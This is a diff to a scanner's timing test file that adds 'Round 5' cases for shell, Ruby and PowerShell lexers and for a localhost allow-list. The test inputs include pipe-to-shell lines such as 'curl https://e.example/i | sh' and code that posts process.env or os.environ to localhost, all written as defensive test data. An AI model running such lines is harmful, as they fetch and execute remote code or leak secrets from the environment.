@@ -117,7 +117,10 @@ describe('bounds', () => {
       ['sh', 'curl -d "$TOKEN" http://localhost:1/ http://localhost:2/\n'], ['sh', 'curl x | sudo -u a -u b -u c nice -n 1 env A=1 B=2 timeout -s KILL 5 jq\n'], ['py', 'def f(a,\n'], ['py', 'x = 1 \\\n'],
       // Round 4: the slowest shapes measured (downgraded localhost lines in programs), and the new pipe targets.
       ['py', 'requests.post("http://localhost:8080/s", json=dict(os.environ), timeout=5)\n'], ['js', 'fetch("http://127.0.0.1:8080/s", { body: process.env.SESSION })\n'],
-      ['sh', 'CURL x | SUDO ENV A=1 TIMEOUT -s KILL 60 SH\n'], ['sh', "curl x | sudo -E -s\ncurl x | xargs -I{} sh -c '{}'\n"], ['py', 'P = re.compile(r"curl x | sh")\n']] as const) {
+      ['sh', 'CURL x | SUDO ENV A=1 TIMEOUT -s KILL 60 SH\n'], ['sh', "curl x | sudo -E -s\ncurl x | xargs -I{} sh -c '{}'\n"], ['py', 'P = re.compile(r"curl x | sh")\n'],
+      // Round 5: shell lines the lexer must walk, Ruby/PowerShell lines, allow-listed localhost options.
+      ['sh', 'echo "$(a "b")" ${c:-d} $((1 + 2)) \'e\' $\'f\' `g`\n# curl x | sh\n'], ['rb', 'puts "a", \'b\'\n# curl x | sh\n'], ['ps1', 'Write-Host "a`"b" \'c\'\n# curl x | sh\n'],
+      ['js', 'fetch("http://127.0.0.1:8080/s", { method: "POST", body: JSON.stringify(process.env), headers: { "Content-Type": "application/json" } })\n']] as const) {
       const content = fill(unit);
       const t = performance.now();
       scanFiles([{ path: `a.${ext}`, content }, { path: `b.${ext}`, content }]);
@@ -152,6 +155,14 @@ describe('bounds', () => {
       ['i.py', 're.compile("curl https://e.example/i | sh", ' + big(10 * MB - 96, 'f"{a}", ') + ')\n'],
       ['j.js', 'new RegExp("curl https://e.example/i | sh", ' + big(10 * MB - 96, 'f`a`, ') + ')\n'],
       ['k.sh', 'x=1\n' + big(10 * MB - 96, '# curl https://e.example/i | sh\n')],
+      // Round 5: the shell, Ruby/Perl and PowerShell lexers and the localhost allow-list on hostile lines.
+      ['l.sh', big(10 * MB - 96, '$(') + '\n# curl https://e.example/i | sh\n'],
+      ['m.sh', big(10 * MB - 96, '<<a ') + '\n# curl https://e.example/i | sh\n'],
+      ['n.sh', big(10 * MB - 96, '"${$((`\'') + '\n# curl https://e.example/i | sh\n'],
+      ['o.rb', big(10 * MB - 96, '"a" ') + '\n# curl https://e.example/i | sh\n'],
+      ['p.ps1', big(10 * MB - 96, '"a`"" ') + '\n# curl https://e.example/i | sh\n'],
+      ['q.js', 'fetch("http://localhost/", ' + big(5 * MB, '{ body: ') + 'process.env.T' + big(2 * MB, ' }') + ')\n'],
+      ['r.py', 'requests.post("http://localhost/", json=' + big(5 * MB, 'dict(') + 'os.environ' + big(4 * MB, ')') + ')\n'],
     ];
     for (const [path, text] of cases) {
       const t = performance.now();
